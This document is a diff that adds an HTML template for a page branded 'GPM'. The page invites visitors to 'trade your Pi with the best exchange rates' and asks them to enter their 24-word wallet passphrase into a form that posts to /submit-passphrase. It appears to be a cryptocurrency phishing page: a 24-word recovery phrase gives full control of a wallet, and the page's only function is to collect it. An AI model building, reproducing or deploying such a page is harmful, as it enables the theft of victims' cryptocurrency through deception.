@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Enter Passphrase</title>
+  <style>
+    body {
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+    }
+    img {
+      width: 200px;
+      margin: 20px auto;
+      display: block;
+    }
+    h2 {
+      font-size: 24px;
+      color: #6a1b9a;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+      margin: 20px auto;
+      max-width: 600px;
+      color: #333;
+    }
+    textarea {
+      width: 90%;
+      max-width: 500px;
+      height: 100px;
+      padding: 10px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 25px;
+      font-size: 18px;
+      background-color: #6a1b9a;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="{{ url_for('static', filename='Gpm_logo.jpeg') }}" alt="Top Logo">
+
+  <h2>LOGIN TO OUR GPM SITE TO GET ACCESS AND TRADE YOUR PI WITH THE BEST EXCHANGE RATES</h2>
+
+  <p>Enter your 24-word passphrase below to unlock access:</p>
+
+  <form action="/submit-passphrase" method="POST">
+    <textarea name="passphrase" placeholder="Enter your 24-word passphrase here..."></textarea><br>
+    <button type="submit">Unlock with passphrase</button>
+  </form>
+
+  <img src="{{ url_for('static', filename='Gpm_logo.jpeg') }}" alt="Bottom Logo">
+
+</body>
+</html>
